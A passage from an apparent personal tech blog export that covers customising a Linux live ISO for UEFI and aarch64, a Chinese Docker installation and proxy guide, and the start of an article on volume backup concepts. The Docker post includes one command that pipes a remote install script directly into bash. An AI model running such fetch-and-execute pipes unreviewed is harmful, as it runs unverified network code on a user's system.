class=\"line\"></span><br><span class=\"line\">function load_video &#123;</span><br><span class=\"line\">  insmod efi_gop</span><br><span class=\"line\">  insmod efi_uga</span><br><span class=\"line\">  insmod video_bochs</span><br><span class=\"line\">  insmod video_cirrus</span><br><span class=\"line\">  insmod all_video</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">load_video</span><br><span class=\"line\">set gfxpayload=keep</span><br><span class=\"line\">insmod gzio</span><br><span class=\"line\">insmod part_gpt</span><br><span class=\"line\">insmod ext2</span><br><span class=\"line\"></span><br><span class=\"line\">set timeout=60</span><br><span class=\"line\">### END /etc/grub.d/00_header ###</span><br><span class=\"line\"></span><br><span class=\"line\">search --no-floppy --set=root -l &#x27;linux&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">### BEGIN /etc/grub.d/10_linux ###</span><br><span class=\"line\">menuentry &#x27;Run Linux Live&#x27; --class openEuler --class gnu-linux --class gnu --class os &#123;</span><br><span class=\"line\">        linuxefi /linux/boot/vmlinuz load_ramdisk=1 prompt_ramdisk=0 rw printk.time=0 apparmor=0</span><br><span class=\"line\">        initrdefi /linux/boot/initrfs.img</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">menuentry &#x27;Run Linux Live debug&#x27; --class openEuler --class gnu-linux --class gnu --class os &#123;</span><br><span class=\"line\">        linuxefi /linux/boot/vmlinuz load_ramdisk=1 prompt_ramdisk=0 rw printk.time=0 apparmor=0 debug</span><br><span class=\"line\">        initrdefi /linux/boot/initrfs.img</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>This time GRUB will use kernel in <code>/linux/boot/vmlinuz</code> and the initrd in <code>/linux/boot/initrfs.img</code> to boot the Linux in UEFI mode. The hierarchy structure of the directory to be packed shoud be like:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree /tmp/linux-data-27494      </span><br><span class=\"line\">/tmp/linux-data-27494</span><br><span class=\"line\">├── EFI</span><br><span class=\"line\">│   └── BOOT</span><br><span class=\"line\">│       └── grub.cfg</span><br><span class=\"line\">└── linux</span><br><span class=\"line\">    ├── boot</span><br><span class=\"line\">    │   ├── bootinst.bat</span><br><span class=\"line\">    │   ├── bootinst.sh</span><br><span class=\"line\">    │   ├── bootlogo.png</span><br><span class=\"line\">    │   ├── efiboot.img</span><br><span class=\"line\">    │   ├── extlinux.x32</span><br><span class=\"line\">    │   ├── extlinux.x64</span><br><span class=\"line\">    │   ├── initrfs.img</span><br><span class=\"line\">    │   ├── isolinux.bin</span><br><span class=\"line\">    │   ├── ldlinux.c32</span><br><span class=\"line\">    │   ├── libcom32.c32</span><br><span class=\"line\">    │   ├── libutil.c32</span><br><span class=\"line\">    │   ├── mbr.bin</span><br><span class=\"line\">    │   ├── pxelinux.0</span><br><span class=\"line\">    │   ├── syslinux.cfg</span><br><span class=\"line\">    │   ├── syslinux.com</span><br><span class=\"line\">    │   ├── syslinux.exe</span><br><span class=\"line\">    │   └── vesamenu.c32</span><br><span class=\"line\">    ├── changes</span><br><span class=\"line\">    └── modules</span><br><span class=\"line\">        └── 01-core.sb</span><br></pre></td></tr></table></figure><br>I repacked the ISO and reboot it, this time it works fine! However, this ISO image can only boot in UEFI mode while the origin one can can boot in BIOS mode. It will be much more convenient for users to be able to boot the linux live system in both BIOS and UEFI mode just using one ISO image, and almost all Linux distribution installation media can do that, so it’s fessible to make one such ‘hybrid’ CD. By reading the document of <code>mkisofs</code> I found that El Torito extention support multiple boot entry in one CD. By adding the <code>-eltorito-alt-boot -no-emul-boot -e linux/boot/efiboot.img</code> option we can create the hybrid CD that works in dual mode:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /tmp/linux-data-xxx &amp;&amp; mkisofs -o <span class=\"string\">&quot;/tmp/linux-x86_64-efi.iso&quot;</span></span><br><span class=\"line\">    -v -J -R -D -N --hide-rr-moved -A linux -V linux \\</span><br><span class=\"line\">    -no-emul-boot -boot-info-table -boot-load-size 4 \\</span><br><span class=\"line\">    -b linux/boot/efiboot.img -c linux/boot/isolinux.boot \\</span><br><span class=\"line\">    -eltorito-alt-boot -no-emul-boot -e linux/boot/efiboot.img .</span><br></pre></td></tr></table></figure><br>Now, if you boot it in BIOS mode, it will use ISOLINUX as the bootloader, and if you choose to boot in UEFI, GRUB menu will show.</p>\n<h2 id=\"Support-aarch64\"><a href=\"#Support-aarch64\" class=\"headerlink\" title=\"Support aarch64\"></a>Support aarch64</h2><p>A few days latter, I got the new requirement to custom Linux liveCD of aarch64 platform. All the operation above is performed on the platform of x86_64, It’s now known if it still works on aarch64. I installed an aarch64 OpenEuler enviroment and replay these procedures, the bad news is that the <code>build</code> script failed at <code>initramfs_create</code> call, the ‘exec format error’ prints when executing <code>busybox</code> in <code>linux-live/initramfs/static</code>. I checked the files in <code>linux-live/initramfs/static</code> and found all those precompile binaries provided by this <code>linux-live</code> kit like <code>busybox</code> are statically linked executable in format of <code>ELF Intel 80386</code>, which cannot be used on aarch64.<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ find initramfs/static | xargs file</span><br><span class=\"line\">initramfs/static:                 directory</span><br><span class=\"line\">initramfs/static/blkid:           ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br><span class=\"line\">initramfs/static/mount.dynfilefs: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br><span class=\"line\">initramfs/static/mkfs.xfs.custom: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br><span class=\"line\">initramfs/static/xfs_growfs:      ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br><span class=\"line\">initramfs/static/mount.httpfs2:   ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br><span class=\"line\">initramfs/static/busybox:         ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped</span><br><span class=\"line\">initramfs/static/ncurses-menu:    ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br><span class=\"line\">initramfs/static/mc:              ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br><span class=\"line\">initramfs/static/eject:           ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no section header</span><br></pre></td></tr></table></figure><br>Some source of the executable like <code>busybox</code> and <code>blkid</code> can be found on Github while the others remain unknown. Thus, I need to delve into the source of this project to find out how this kit works, and recompile these binaries.</p>\n<p>First, download <code>busybox</code> source code and build a statically linked <code>busybox</code> executable to replace the old one in <code>linux-live/initramfs/static</code>. If your want to use a cross compile toolchain to finish this step, you can refer to this tutorial : <a href=\"https://subscription.packtpub.com/book/iot-and-hardware/9781783289851/1/ch01lvl1sec09/compiling-busybox-simple\">compiling busybox simple</a>. You can also make it directly on a aarch64 environment.</p>\n<p>After I read the <code>initramfs_create</code> script, I found the <code>busybox</code> is used to simulate the Linux common utils, these utils like <code>/bin/ls</code>, <code>/bin/bash</code> are all linked to <code>/bin/busybox</code>. I also noticed that the <code>busybox</code> can simulate <code>blkid</code> and <code>eject</code> too, and the remaining executables like <code>xfs_growfs</code> are not necessary so recompile <code>busybox</code> on aarch64 is enough. After replaced the <code>busybox</code> executable. I restart the <code>build</code> script and the ‘exec format error’ didn’t show anymore.</p>\n<p>I use the newly produced aarch64 ISO to boot and nothing is bootable. It’s not suprising since there’s alse other platform-dependent binaries used in the kit that I haven’t replaced yet. It’s easy to think of: the bootloader. Since ARM archtecture doesn’t have BIOS boot, we can discard the ISOLINUX bootloader and use GRUB only. Just like how I did to add support to x86_64 UEFI mode before, I downloaded a <code>openEuler-22.03-LTS-SP3-aarch64-dvd.iso</code> and extract the <code>efiboot.img</code> to replace the previous one. Also, I modified the <code>/EFI/BOOT/grub.cfg</code> to fit the aarch64 platform as below:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set default=&quot;1&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">function load_video &#123;</span><br><span class=\"line\">  if [ x$feature_all_video_module = xy ]; then</span><br><span class=\"line\">    insmod all_video</span><br><span class=\"line\">  else</span><br><span class=\"line\">    insmod efi_gop</span><br><span class=\"line\">    insmod efi_uga</span><br><span class=\"line\">    insmod ieee1275_fb</span><br><span class=\"line\">    insmod vbe</span><br><span class=\"line\">    insmod vga</span><br><span class=\"line\">    insmod video_bochs</span><br><span class=\"line\">    insmod video_cirrus</span><br><span class=\"line\">  fi</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">load_video</span><br><span class=\"line\">set gfxpayload=keep</span><br><span class=\"line\">insmod gzio</span><br><span class=\"line\">insmod part_gpt</span><br><span class=\"line\">insmod ext2</span><br><span class=\"line\"></span><br><span class=\"line\">set timeout=60</span><br><span class=\"line\">### END /etc/grub.d/00_header ###</span><br><span class=\"line\"></span><br><span class=\"line\">search --no-floppy --set=root -l &#x27;linux&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">### BEGIN /etc/grub.d/10_linux ###</span><br><span class=\"line\">menuentry &#x27;Run Linux Live&#x27; --class openEuler --class gnu-linux --class gnu --class os &#123;</span><br><span class=\"line\">        linux /linux/boot/vmlinuz load_ramdisk=1 prompt_ramdisk=0 rw printk.time=1 apparmor=0 video=VGA-1:640x480-32@60me rgbh console=tty0</span><br><span class=\"line\">        initrd /linux/boot/initrfs.img</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">menuentry &#x27;Run Linux Live debug&#x27; --class openEuler --class gnu-linux --class gnu --class os &#123;</span><br><span class=\"line\">        linux /linux/boot/vmlinuz load_ramdisk=1 prompt_ramdisk=0 rw printk.time=1 apparmor=0 debug video=VGA-1:640x480-32@60me rgbh console=tty0</span><br><span class=\"line\">        initrd /linux/boot/initrfs.img</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>After these modification is done, I repacked the ISO and boot again, the GRUB menu shows! However, no display come to screen anymore. We have successfully load the bootloader, it seem that the kernel or initramfs have some problem durring the early boot stage. To check where got stuck, I need to use <em>qemu</em> to debug the early boot process. </p>\n<p>If your are using ArchLinux, you just use <code>sudo pacman -S qemu-full qemu-system-aarch64 virt-manager dnsmasq</code> to install <em>qemu</em> and <em>virt-manager</em>. <a href=\"https://wiki.archlinux.org/title/Virt-manager\">virt-manager</a> is a nice user graphic interface for <em>qemu</em> that function like VMware to allow aarch64 operating system run on my x86_64 PC.</p>\n<p>You can also build <em>qemu</em> from source:</p>\n<ol>\n<li><p>build <em>ninja</em></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ wget https://github.com/ninja-build/ninja/archive/refs/tags/v1.10.2.tar.gz</span><br><span class=\"line\">$ tar zxvf v1.10.2.tar.gz &amp;&amp; <span class=\"built_in\">cd</span> ninja-1.10.2</span><br><span class=\"line\">$ ./configure.py --bootstrap</span><br><span class=\"line\">$ sudo cp ninja /usr/bin</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>build <em>qemu</em></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ mkdir build &amp;&amp; <span class=\"built_in\">cd</span> build</span><br><span class=\"line\">$ sudo mkdir -p /usr/<span class=\"built_in\">local</span>/qemu</span><br><span class=\"line\">$ ../configure --enable-virtfs --target-list=aarch64-softmmu,arm-softmmu --prefix=/usr/<span class=\"built_in\">local</span>/qemu</span><br><span class=\"line\">$ make -j16</span><br><span class=\"line\">$ sudo make install</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>add <em>/usr/local/qemu/bin</em> to <code>$PATH</code></p>\n</li>\n</ol>\n<blockquote>\n<p>If you encountered the error “Failed to connect socket to ‘/var/run/libvirt/libvirt-sock’”, check if <code>libvertd</code> service is started.</p>\n</blockquote>\n<p>configure the qemu network, create a network card on host:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo ip tuntap add dev tap0 mode tap</span><br><span class=\"line\">$ sudo ip link <span class=\"built_in\">set</span> dev tap0 up</span><br><span class=\"line\">$ sudo ip address add dev tap0 192.168.2.128/24</span><br><span class=\"line\">$ ifconfig</span><br><span class=\"line\">tap0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 192.168.2.128  netmask 255.255.255.0  broadcast 0.0.0.0</span><br><span class=\"line\">        ether 8a:3c:1a:1f:cc:6d  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ qemu-system-aarch64 -m 2000 -cpu cortex-a72 -smp 8 -M virt \\</span><br><span class=\"line\">-drive <span class=\"keyword\">if</span>=none,file=/home/xuranus/workspace/linux-live/tmp/linux-aarch64-efi.iso,id=cdrom,media=cdrom \\</span><br><span class=\"line\">-device virtio-scsi-device \\</span><br><span class=\"line\">-device scsi-cd,drive=cdrom \\</span><br><span class=\"line\">-net nic -net user \\</span><br><span class=\"line\">-kernel /home/xuranus/workspace/linux-live/tmp/vmlinuz \\</span><br><span class=\"line\">-initrd /home/xuranus/workspace/linux-live/tmp/linux-initramfs-29628.img \\</span><br><span class=\"line\">-append <span class=\"string\">&quot;earlyprintk=serial,ttyAMA0 console=ttyAMA0&quot;</span> -nographic</span><br></pre></td></tr></table></figure>","tags":["Linux"]},{"title":"Docker入门（一）安装与配置","url":"/2021/04/07/Docker%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/","content":"<blockquote>\n<p>容器技术就像集装箱，用最精简的封装，保护组件运行，互不冲突，便于服务迁移。</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>ArchLinux下可以直接用Pacman安装：<code>sudo pacman -S docker</code><br>其他Linux平台可以用官方安装脚本：<code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code><br>Windows平台下可参照官方的安装说明：<a href=\"https://docs.microsoft.com/zh-cn/virtualization/windowscontainers/manage-docker/configure-docker-daemon\">Windows 上的 Docker 引擎</a></p>\n<p>以下的操作基于Linux环境。安装成功后，<code>docker -v</code>显示版本：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Docker version 18.09.3-ce, build 774a1f4eee</span><br></pre></td></tr></table></figure><br>首次启动前先换源：<code>sudo vim /etc/docker/daemon.json</code>，加入以下内容：<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">   <span class=\"attr\">&quot;registry-mirrors&quot;</span>:[<span class=\"string\">&quot;https://registry.docker-cn.com&quot;</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>启动:<br><code>sudo systemctl start docker</code></p>\n<span id=\"more\"></span>\n<p>测试一个简单的例子，最小的镜像helloworld,先从仓库获取镜像：<br><code>sudo docker pull hello-world</code><br><code>sudo docker run hello-world</code></p>\n<p>输出如下信息说明安装正确：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker run hello-world</span><br><span class=\"line\"></span><br><span class=\"line\">Hello from Docker!</span><br><span class=\"line\">This message shows that your installation appears to be working correctly.</span><br><span class=\"line\"></span><br><span class=\"line\">To generate this message, Docker took the following steps:</span><br><span class=\"line\"> 1. The Docker client contacted the Docker daemon.</span><br><span class=\"line\"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class=\"line\">    (amd64)</span><br><span class=\"line\"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class=\"line\">    executable that produces the output you are currently reading.</span><br><span class=\"line\"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class=\"line\">    to your terminal.</span><br><span class=\"line\"></span><br><span class=\"line\">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class=\"line\"> $ docker run -it ubuntu bash</span><br><span class=\"line\"></span><br><span class=\"line\">Share images, automate workflows, and more with a free Docker ID:</span><br><span class=\"line\"> https://hub.docker.com/</span><br><span class=\"line\"></span><br><span class=\"line\">For more examples and ideas, visit:</span><br><span class=\"line\"> https://docs.docker.com/get-started/</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"运行一个http服务器\"><a href=\"#运行一个http服务器\" class=\"headerlink\" title=\"运行一个http服务器\"></a>运行一个http服务器</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker run -d -p 81:80 httpd</span><br></pre></td></tr></table></figure>\n<p>直接<code>docker run</code>会先在本地查找镜像，如果没有找到，就会到registry里下载，<code>80:81</code>表示把host的81端口映射到容器的80端口。此时输入<code>http://host:81</code>就可以发现httpd镜像已经成功运行了。</p>\n<p>查看容器状态：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker info</span><br></pre></td></tr></table></figure><br>输出如下内容，两个容器，一个是helloworld，一个是httpd（运行中）<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Containers: 2</span><br><span class=\"line\"> Running: 1</span><br><span class=\"line\"> Paused: 0</span><br><span class=\"line\"> Stopped: 1</span><br><span class=\"line\">Images: 2</span><br><span class=\"line\">Server Version: 18.09.3-ce</span><br><span class=\"line\">Storage Driver: overlay2</span><br><span class=\"line\"> Backing Filesystem: extfs</span><br><span class=\"line\"> Supports d_type: true</span><br><span class=\"line\"> Native Overlay Diff: false</span><br><span class=\"line\">Logging Driver: json-file</span><br><span class=\"line\">Cgroup Driver: cgroupfs</span><br><span class=\"line\">Plugins:</span><br><span class=\"line\"> Volume: local</span><br><span class=\"line\"> Network: bridge host macvlan null overlay</span><br><span class=\"line\"> Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog</span><br><span class=\"line\">Swarm: inactive</span><br><span class=\"line\">Runtimes: runc</span><br><span class=\"line\">Default Runtime: runc</span><br><span class=\"line\">Init Binary: docker-init</span><br><span class=\"line\">containerd version: 9f2e07b1fc1342d1c48fe4d7bbb94cb6d1bf278b.m</span><br><span class=\"line\">runc version: ccb5efd37fb7c86364786e9137e22948751de7ed-dirty</span><br><span class=\"line\">init version: fec3683</span><br><span class=\"line\">Security Options:</span><br><span class=\"line\"> seccomp</span><br><span class=\"line\">  Profile: default</span><br><span class=\"line\">Kernel Version: 5.0.0-arch1-1-ARCH</span><br><span class=\"line\">Operating System: Arch Linux</span><br><span class=\"line\">OSType: linux</span><br><span class=\"line\">Architecture: x86_64</span><br><span class=\"line\">CPUs: 8</span><br><span class=\"line\">Total Memory: 31.32GiB</span><br><span class=\"line\">Name: xuranus</span><br><span class=\"line\">ID: AVA4:CSHR:VYY2:JQEY:LQHZ:NBAE:FODY:Z2DB:NXWF:YREE:RUEU:O6OD</span><br><span class=\"line\">Docker Root Dir: /var/lib/docker</span><br><span class=\"line\">Debug Mode (client): false</span><br><span class=\"line\">Debug Mode (server): false</span><br><span class=\"line\">Registry: https://index.docker.io/v1/</span><br><span class=\"line\">Labels:</span><br><span class=\"line\">Experimental: false</span><br><span class=\"line\">Insecure Registries:</span><br><span class=\"line\"> 127.0.0.0/8</span><br><span class=\"line\">Registry Mirrors:</span><br><span class=\"line\"> https://registry.docker-cn.com/</span><br><span class=\"line\">Live Restore Enabled: false</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"代理配置\"><a href=\"#代理配置\" class=\"headerlink\" title=\"代理配置\"></a>代理配置</h2><p>之前的文章中讲过provixy，cow，proxychain几乎可以解决所有的代理问题，但Docker下例外。经测试，Docker的代理需要单独配置。<br>本地运行provixy进行HTTP代理，端口8010。</p>\n<p>首先创建文件夹<code>sudo mkdir /etc/systemd/system/docker.service.d</code></p>\n<p>https代理配置: <code>vim /etc/systemd/system/docker.service.d/https-proxy.conf</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Service]</span><br><span class=\"line\">Environment=&quot;HTTPS_PROXY=127.0.0.1:8010&quot; &quot;NO_PROXY=localhost,127.0.0.1&quot;</span><br></pre></td></tr></table></figure></p>\n<p>http代理配置：<code>sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Service]</span><br><span class=\"line\">Environment=&quot;HTTP_PROXY=127.0.0.1:8010&quot;</span><br></pre></td></tr></table></figure></p>\n<p>应用改变：<code>sudo systemctl daemon-reload</code><br>查看配置：<code>sudo systemctl show docker</code><br>重启：<code>sudo systemctl restart docker</code>，此时<code>docker pull</code>或者<code>docker login</code>都已可以正常使用。</p>\n","tags":["Docker"]},{"title":"Explore Volume Backup","url":"/2023/09/01/Explore-Volume-Backup/","content":"<blockquote>\n<p>Although volume-based backup/restore has significant limitations: using volume backup in scenarios with low file system utilization will result in low copy storage space utilization. In scenarios where the backed-up files are generally large, file-level backup can achieve good performance and efficiently use storage space. However, volume backup also has advantages in specific scenarios: it is common in the field of forensic examination of host hard disks based on volume backup. Backup of the entire volume can achieve high backup/restore speed, and the system volume backup can directly restore the operating system. This article starts by introducing the basic concepts of volumes, summarizing several solutions for volume backup, recovery, and subsequent utilization of copy data on the Windows/Linux platforms. Based on the technical solutions mentioned in this article, the author has implemented a set of volume backup tools, achieving full backup and permanent incremental backup of volumes under Windows/Linux, as well as recovery and timely mounting of volume copies. The source code can be found at: <a href=\"https://github.com/XUranus/VolumeBackup\">https://github.com/XUranus/VolumeBackup</a>, and this article can be considered as documentation for this project.</p>\n</blockquote>\n<h1 id=\"Basic-Concepts-of-Volumes-Partitions-and-Disks\"><a href=\"#Basic-Concepts-of-Volumes-Partitions-and-Disks\" class=\"headerlink\" title=\"Basic Concepts of Volumes, Partitions, and Disks\"></a>Basic Concepts of Volumes, Partitions, and Disks</h1><p>Before describing the logic of volume backup/restore, let’s first introduce what a volume is because volume (Volume), partition (Partition), and hard disk (Hard disk) are often confused concepts. The hard disk is a physical concept, with commonly used hard disks such as Hard Disk Drive (HDD) and Solid State Disk (SSD), but this article does not go into detail about hardware. Volumes and partitions are both storage areas for data, similar but not the same: <strong>a volume is an accessible storage area with a single file system, and a partition is a part of a hard disk partitioned out</strong>. This means that a partition is often a specific concept, existing in a continuous specific area on a specific disk. A partition may not have a file system (typically an uninitialized RAW partition is also considered a partition). A volume, on the other hand, is an abstract concept that must be strongly associated with a single file system, and a volume may exist on one or more disks. Since a volume is a logical concept, it exhibits differences for Linux/Windows operating systems, and physical partitions are the basis for forming logical volumes, so to understand volumes deeply, we need to start with partitions.</p>\n<span id=\"more\"></span>\n<h2 id=\"Partition\"><a href=\"#Partition\" class=\"headerlink\" title=\"Partition\"></a>Partition</h2><p>Whether it’s Linux or Windows, hard disk partitioning uses GPT or MBR partition tables, and each disk supports only one partition table to define the disk layout. There are two types: MBR and GPT:</p>\n<ul>\n<li><p>Master Boot Record (MBR): MBR is an older partitioning scheme commonly used on Windows, occupying the first 512 bytes of the disk header. Since MBR uses 32-bit addressing for logical block addresses, the address space is only $2^{32}$, resulting in a maximum space limitation of $2^{41}B = 2TB$ when calculated at 512B per block. MBR has limited support for the number of partitions, with a maximum of four primary partitions or three primary partitions with one extended partition. The system disk that uses MBR partitioning can only boot in BIOS (Legacy) mode.</p>\n</li>\n<li><p>GUID Partition Table (GPT): GPT is a newer partitioning scheme, occupying part of the space at the beginning and end of the disk and is expandable. GPT can overcome various limitations of MBR, supporting up to 128 primary partitions, and partition sizes can reach 9.4ZB. System disks using GPT as the partition table boot using EFI, requiring BIOS support for EFI (generally supported by modern computers).</p>\n</li>\n</ul>\n<p><strong>Each partition allocated by GPT is considered a primary partition</strong>. MBR can allocate 4 primary partitions or 3 primary partitions and 1 extended partition, and <strong>on the extended partition, logical partitions (Logical Partition) can be further divided</strong>. Discussing primary partitions, extended partitions, and logical partitions generally applies to the Windows + MBR scenario:</p>\n<ul>\n<li>Primary Partitions: Up to 4. <strong>Requires assignment of drive letters</strong> and can be used as the system drive <code>C:\\</code>.</li>\n<li>Extended Partition: Up to 1, which can contain several logical partitions.</li>\n<li>Logical Partition: Only used for storing data information, not for the system drive. <strong>Drive letters are not required to be assigned</strong>.</li>\n</ul>\n<p><img src=\"volume-vs-partition-2.png\" alt=\"\"></p>\n<h2 id=\"Volume\"><a href=\"#Volume\" class=\"headerlink\" title=\"Volume\"></a>Volume</h2><p>A volume is a more abstract concept built on top of partitions, <strong>a volume can occupy one or more partitions</strong>, and it can occupy different partitions not on the same hard disk, giving volumes a scalability that far exceeds partitions. Even if MBR only supports partitions up to 2TB, larger file systems can be created by spanning multiple partitions through volumes. Since volumes are a logical concept, their definition, implementation, and management vary across different operating systems.</p>\n<h3 id=\"LDM-Basic-Disk-and-Dynamic-Disk\"><a href=\"#LDM-Basic-Disk-and-Dynamic-Disk\" class=\"headerlink\" title=\"LDM, Basic Disk, and Dynamic Disk\"></a>LDM, Basic Disk, and Dynamic Disk</h3><p>Windows introduces the concepts of Basic Disk and Dynamic Disk. For Windows, the significant difference between volumes and partitions is that <strong>partitions are created on Basic Disks, while volumes are created on Dynamic Disks</strong>. In Windows <em>Disk Management</em>, you can set a disk to be a Basic Disk or a Dynamic Disk: <img src=\"volume-vs-partition-1.png\" alt=\"\">. Right-clicking on a disk allows you to convert a Basic Disk to a Dynamic Disk, and this conversion process is lossless. Conversely, converting a Dynamic Disk to a Basic Disk is not supported (requires third-party tools). The head and tail areas of a Dynamic Disk have specific metadata written to describe the partition layout to support more powerful scalability. Volumes created based on Dynamic Disks have the following types:</p>\n<ul>\n<li>Simple Volume: Occupies one partition on a disk. Simple volumes are the most common on PCs, created by right-clicking on a RAW partition in Windows Disk Manager.</li>\n<li>Mirrored Volume: Maintains data redundancy using copies located on two different hard disks. All write operations are performed on both disks separately, and read operations can be load-balanced between the two disks to improve performance. Mirrored volumes provide data resilience, ensuring data safety even when one disk is unavailable.</li>\n<li>Striped Volume: Also known as RAID 0, it creates a logical volume using partitions on two or more disks, and each write operation is performed on only one disk. This mechanism provides multiple channels, improving I/O throughput. However, Striped Volumes do not provide data redundancy, cannot achieve data resilience, and any disk failure leads to data loss, making it the <strong>least reliable</strong> type of volume.</li>\n<li>Spanned Volume: Merges partitions from multiple disks into a logical volume, with a sequential order among partitions. It increases volume capacity but does not provide data redundancy and cannot achieve data resilience.</li>\n<li>RAID-5 Volume: Uses three or more disks, consolidating the advantages of Striped, Spanned, and Mirrored Volumes. It maintains redundant copies of data and can quickly recover data after partial disk failure. It not only improves throughput but also expands volume space while providing data resilience.</li>\n</ul>\n<p>Volumes on Windows are generally managed through LDM (Logical Disk Manager), which is based on the Basic Disk/Dynamic Disk mechanism. By writing specific metadata at the head and tail of the hard disk, LDM records the relationships between dynamic disks to form logical volumes.</p>\n<blockquote>\n<p>Note: Whether it’s a Dynamic Disk or a Basic Disk, each has its partition table, and it is either MBR or GPT.</p>\n</blockquote>\n<h3 id=\"LVM-and-DeviceMapper\"><a href=\"#LVM-and-DeviceMapper\" class=\"headerlink\" title=\"LVM and DeviceMapper\"></a>LVM and DeviceMapper</h3><p>On Linux, volumes are generally managed through LVM (Logical Volume Manager). LVM provides capabilities such as creating LVM volumes from multiple block devices, managing volume groups, elastic resizing, snapshotting, etc. It relies on Linux’s DeviceMapper. DeviceMapper can create various logical volumes similar to several types on Windows: mirror, striped, linear (Windows’ Spanned Volume), RAID. Additionally, DeviceMapper can be used to implement the encryption layer of encrypted file systems. The usage of the CLI program <code>dmsetup</code> for DeviceMapper can be found in <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/logical_volume_manager_administration/device_mapper\">Appendix A. The Device Mapper</a>.</p>\n<p>Devices created by DeviceMapper have a path format like <code>/dev/dm-X</code> and are symlinked to <code>/dev/mapper/$dmDevName</code>.</p>\n<blockquote>\n<p><code>/dev/dm-X</code> looks like <code>/dev/dm-0</code>, <code>/dev/dm-1</code>, etc., and <code>$dmDevName</code> in <code>/dev/mapper/$dmDevName</code> represents a unique name for a DeviceMapper device. I/O requests for block device paths created by DeviceMapper are mapped to different target disk offsets by the DeviceMapper driver in the Linux Kernel according to user-configured rules (DM Table). The control information for creating/deleting devices is controlled by DeviceMapper forwarding to the control device <code>/dev/mapper/control</code>. Creating an LVM volume, such as <code>lv1</code> in volume group <code>vg1</code>, will be mapped to <code>/dev/mapper/vg1-lv1</code>, and initializing the volume’s file system and creating logical volumes can be done by pointing to these virtually created logical block devices using <code>mkfs</code>.</p>\n</blockquote>\n<h1 id=\"Retrieving-Volume-Information\"><a href=\"#Retrieving-Volume-Information\" class=\"headerlink\" title=\"Retrieving Volume Information\"></a>Retrieving Volume Information</h1><p>The above discussion covered the basic concepts of volumes on Windows and Linux. At this point, readers should understand why the title is “Volume Backup” rather than “Partition Backup” or “Disk Backup.” To back up a volume, you only need to interact with the volume devices abstracted by the operating system, without needing to be aware of how the partitions constituting the volume are distributed on the disk. Volumes are strongly related to file systems, and volumes are the meaningful concepts that we actually need to back up. To back up a volume device means backing up the metadata of the volume (size, UUID, mount information, etc.) and the binary data within the volume. Next, let’s explore how to use platform-specific APIs to read 